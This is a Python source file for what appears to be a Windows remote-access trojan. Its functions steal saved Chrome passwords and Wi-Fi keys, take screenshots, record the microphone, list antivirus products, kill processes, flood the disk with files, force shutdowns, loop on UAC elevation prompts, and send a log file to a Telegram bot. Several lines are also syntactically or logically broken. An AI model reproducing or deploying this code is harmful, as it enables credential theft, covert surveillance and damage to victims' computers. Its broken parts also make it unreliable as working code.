# [~] Main_Core.py
# Codeing "UTF-8"
# CopyRight (C) 2023 By *Mr-Melfex*
# License BCD (SEE LICENSE IN MAIN FOLDER)

from	Config.Main_Config							import	*
from	Modules.Modules 							import	*
from    Main										import  *
from 	Version.Main_Version						import	*
from 	Proxy.Main_Proxy							import 	*

#//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--#

def ReadJSON():
	with open (InstallPath + "DateBase.json", "r", encoding="UTF-8") as DateBase:
		Date = json.load(DateBase)
		return Date

def TimeNow():
    DateCun = datetime.datetime.now()
    DateY = DateCun.strftime("%Y")
    Datem = DateCun.strftime("%m")
    DateD = DateCun.strftime("%d")
    DateH = DateCun.strftime("%H")
    DateM = DateCun.strftime("%M")
    DateS = DateCun.strftime("%S")
    DateF = DateCun.strftime("\t%Y-%m-%d | %H:%M:%S")
    Date = {"Years" : DateY,
            "Month" : Datem,
            "Day" : DateD,
            "Horse" : DateH,
            "Min" : DateM,
            "Second" : DateS,
            "DateFull" : DateF}
    return Date

def LOG(text):
	LogFile = open(ReadJSON()["Direct"] + (f"{ReadJSON()["LogFileName"]}.txt"), "a", encoding="UTF-8")
	LogFile.write("".join(text))
	LogFile.write(TimeNow()["DateFull"])
	LogFile.write("\n")
	LogFile.close()

PathFile = f"{ReadJSON()["LogFileName"]}.txt"
DirFile = {Direct : open(os.getenv(PathFile))} 
def SendLog():
	try:
		if ReadJSON()["SendLogFile"] == "True":
			BotLink = "https://api.telegram.org/file/bot" + str(TelegramToken) + "/sendDocument?chat_id=" + TelegramID + ", files={}".format(PathFile)
			SendFile = requests.post(BotLink)
	except:
		pass

if ReadJSON()["SendLogFile"] == "True":
	time.sleep({ReadJSON()["TimeSleepSendLog"]})
	SendLog()

LogFileSize = os.path.getsize(ReadJSON()["Direct"] + f"{ReadJSON()["LogFileName"]}.txt")
if LogFileSize == 2000:
	os.remove(ReadJSON()["Direct"] + f"{ReadJSON()["LogFileName"]}.txt")
	open(ReadJSON()["Direct"] + (f"{ReadJSON()["LogFileName"]}.txt"), "w+")

def ChangeProxy():
	threading.Thread(target= proxy.main).start()
	ProxyInfo = requests.get("http://ipinfo.io").text
	ProxyIp = (loads(ProxyInfo)["ip"])
	return ProxyIp

def CheckVersion():
	try:
		Version = open(InstallPath + "Version.txt", "r", encoding="UTF-8").read()
		return Version
	except:
		LOG("TEST\n")

def AutoUpdate():
	try:
		if CheckVersion() == "1.1":
			pass
		else:
			pass
	except:
		LOG("TEST\n")

if AutoUpdate == True:
	AutoUpdate()

def ChromeInfo():
	Conn =  sqlite3.connect(os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data")
	Cur = Conn.cursor()
	Cur.execute("SELECT origin_url,username_value,password_value from logins;")
	for users in Cur.fetchall():
		Info = {"WEB" : users[0],
		"USERNAME" : users[1],
		"PASSWORD" : str(win32crypt.CryptUnprotectData(users[2], None, None, None, 0))}
	return Info

def Screenshot():
	with mss.mss() as Screen:
		File = ReadJSON()["Direct"] + f"{TimeNow()["Horse"]}-{TimeNow()["Min"]}-{TimeNow()["Second"]}.jpg"
		if os.path.exists(File):
			os.remove(File)
		Screen.shot(output=File)

def TaskList():
	TaskKall = subprocess.Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.readlines()
	Pross = [TaskKall[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(TaskKall))]
	open(ReadJSON()["Direct"] + "TaskList.txt", "w", encoding="UTF-8").write('\n'.join(Pross))

def KillAllTask():
		ExeListFile = open(ReadJSON()["Direct"] + "TaskList.txt", "r", encoding="UTF-8")
		for i in ExeListFile:
			i = i.strip("\n")
			if not i.endswith(".exe"):
				i = i.strip("\n")
				i = i + ".exe"
			os.system("TASKKILL /F /IM {}".format(i))

# def Disabl_selected_taskk(exe_name):
# 	try:
# 		if not exe_name.endswith(".exe"):
# 			exe_name = exe_name + ".exe"
# 		subprocess.call("TASKKILL /F /IM " + exe_name, shell=True)
# 	except:
# 		pass

def WifiScan():
        Wifi = pywifi.PyWiFi()
        Interface = Wifi.interfaces()[0]
        Interface.scan()
        Bss = Interface.scan_results()
        Wifi_name_set = set()
        for w in Bss:
            wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
            Wifi_name_set.add(wifi_name_and_signal)
        Wifi_name_list = list(Wifi_name_set)
        Wifi_name_list = sorted(Wifi_name_list, key=lambda a: a[0], reverse=True)
        return Wifi_name_list

def WifiInfo():
	Rz = []
	Chcp = 'chcp 65001 && '
	Networks = subprocess.check_output(f"{Chcp}netsh wlan show profile",
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	Networks = Networks.decode(encoding="UTF-8", errors="strict")
	NetworkNamesList = re.findall('(?:Profile\\s*:\\s)(.*)', Networks) 
	for NetworkName in NetworkNamesList:
		CurrentResult = subprocess.check_output(f'{Chcp}netsh wlan show profile {NetworkName} key=clear',
			shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		CurrentResult = CurrentResult.decode(encoding='utf-8', errors='strict')        
		SSID = re.findall('(?:SSID name\\s*:\\s)(.*)', str(CurrentResult))[0].replace('\r', '').replace("\"", '')
		Authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Cipher = re.findall('(?:Cipher\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		SecurityKey = re.findall(r'(?:Security key\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Password = re.findall('(?:Key Content\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		WiFi = {'SSID >> ': SSID, 'AUTH >> ': Authentication, 'CIPHER >> ': Cipher, 'SECURITKEY >> ': SecurityKey, 'PASSWORD >> ': Password}
		open(ReadJSON()["Direct"] + "WifiInfo.txt", "w", encoding = "UTF-8").write("\n".join(WiFi))
	return WiFi

def ShutDown():
	subprocess.call("SHUTDOWN -S /T 0 /F", shell=True)

def Restart():
	subprocess.call("SHUTDOWN -R /T 0 /F", shell=True)

def Sleep():
	subprocess.call("SHUTDOWN -H /F", shell=True)

def Logoff():
	subprocess.call("SHUTDOWN -L /F", shell=True)

def OpenUrl(link):
	if not link.startswith("http://"):
		link = "http://" + link 
	subprocess.call("START " + link, shell=True)

def FileAttack(dir):
	while True:
		Rand = str(random.random())
		open(dir + f"{Rand}", "w")

def ExeAttack(exe):
	while True:
		if not exe.endswith(".exe"):
			exe = exe + ".exe"
		os.startfile(exe)

def SwapMouse():
	os.system("rundll32 user32,SwapMouseButton")

def OpenDvdDrive():
	Open = ctypes.windll.WINMM.mciSendStringW(U"SET CDAUDIO DOOR OPEN", None, 0, None)

def OffMonitor():
	ctypes.windll.user32.SendMessageA(0xFFFF, 0x112, 0xF170, 2)

def MessageBox1(message):
	ctypes.windll.user32.MessageBoxW(0, message, U"", 0x41)

def MessageBox2(message):
	while True:
		os.system(f"MSG * {message}")

def VoiceMessage(message):
	EN = pyttsx3.init()
	EN.setProperty("MELFEX", 110) 
	EN.say(message)
	EN.runAndWait()

def VoiceRecorder(TIME):
	p = pyaudio.PyAudio()
	Rec = p.open(format= pyaudio.paInt16, channels = 2, rate = 44100, input = True, frames_per_buffer = 1024)
	VoiceD = []
	for i in range(0, int(44100/1024 * float(TIME))):
		data = Rec.read(1024)
		VoiceD.append(data)
	Rec.stop_stream()
	Rec.close()
	p.terminate()
	DirFile = wave.open(ReadJSON()["Direct"] + f"{TimeNow()["Horse"]}-{TimeNow()["Min"]}-{TimeNow()["Second"]}.wav", 'wb')
	DirFile.setnchannels(2)
	DirFile.setsampwidth(p.get_sample_size(pyaudio.paInt16))
	DirFile.setframerate(44100)
	DirFile.writeframes(b''.join(VoiceD))
	DirFile.close()

def ShowIthemFolder(Dir):
	Dirs = os.listdir(Dir)
	File = open(ReadJSON()["Direct"] + "IthemFolderInfo.txt", "w", encoding="UTF-8").write("\n".join(Dirs))

def RemoveFolfer(Folder_name):
	os.removedirs(Folder_name)

def RemoveFile(file_name):
	os.remove(file_name)

def RenameFile(file_name):
	os.rename(file_name)

def Download(file):
	open(file, "rb")

def SystemInformation():
	UserName = os.getlogin()
	WindowsMudle = platform.platform()
	WindowsProcesser = platform.processor()
	Info = {"USERNAME" : UserName, "WINDOWSNUMBER" : WindowsMudle, "WINDOWSPROCESS" : WindowsProcesser}
	return Info

def RamInfo():
	Check = subprocess.check_output('wmic ' + "ComputerSystem" + ' get ' + "TotalPhysicalMemory",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	A = Check.decode("UTF-8")
	B = A.split("\n")
	return(B[1])

def CpuInfo():
	Check = subprocess.check_output('wmic ' + "CPU" + ' get ' + "Name",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	A = Check.decode("UTF-8")
	B = A.split("\n")
	return(B[1])

def GpuInfo():
	Check = subprocess.check_output('wmic ' + "path Win32_VideoController" + ' get ' + "Name",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	A = Check.decode("UTF-8")
	B = A.split("\n")
	return(B[1])
	
def InternalIp():
    Internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    Internal_ip.connect(('google.com', 0))
    return Internal_ip.getsockname()[0]

def Location():
	Info = requests.get('http://ipinfo.io').text
	Response = 'External IP: ' 
	Response += "".join(filter(lambda char: char in string.printable, Info))
	Response = re.sub('[:,{}\t\"]', '', Response)
	Response += '\n' + 'Internal IP: ' + '\n\t' + InternalIp()
	return Response

def Antivirus():
	Antivirus_path = {'C:\\Program Files\\Windows Defender': 'Windows Defender', 'C:\\Program Files\\AVAST Software\\Avast': 'Avast', 'C:\\Program Files\\AVG\\Antivirus': 'AVG','C:\\Program Files (x86)\\Avira\\Launcher': 'Avira','C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare','C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender','C:\\Program Files\\DrWeb': 'Dr.Web','C:\\Program Files\\ESET\\ESET Security': 'ESET','C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab','C:\\Program Files (x86)\\360\\Total Security': '360 Total Security'}
	Antivirus = [Antivirus_path[d] for d in filter (os.path.exists, Antivirus_path)]

def Uninstall():
	with open(Direct + "Uninstall.bat", "w") as UninstallBat:
		UninstallBat.writelines([f'rmdir /s /q "{ReadJSON()["InstallPath"]}"',
						   f'rmdir /s /q "{ReadJSON()["Direct"]}"'])
		while True:
			try:
				os.startfile(ReadJSON()["Direct"] + "Uninstall.bat", "runas")
			except:
				LOG("[!] ERROR! Uninstall Filed")
				pass
			else:
				break

def AdminStat():
	return ctypes.windll.shell32.IsUserAnAdmin() != 0
Name = os.path.basename(sys.argv[0])
Path = sys.argv[0]
File = [Direct]
for Direct in File:
	try:
		os.makedirs(Direct)
	except:
		pass
	else:
		if not os.path.exists(Direct):
			os.makedirs(Direct)

if ReadJSON()["AdminRightsReq"] is "True":
	if AdminStat is False:
		while True:
			try:
				print("[:D] Trying to Administrstor..")
				os.startfile(Path, "runas")
			except:
				pass
			else:
				print("[:D]" + Name + "Opened as Admin Rights..")
				sys.exit()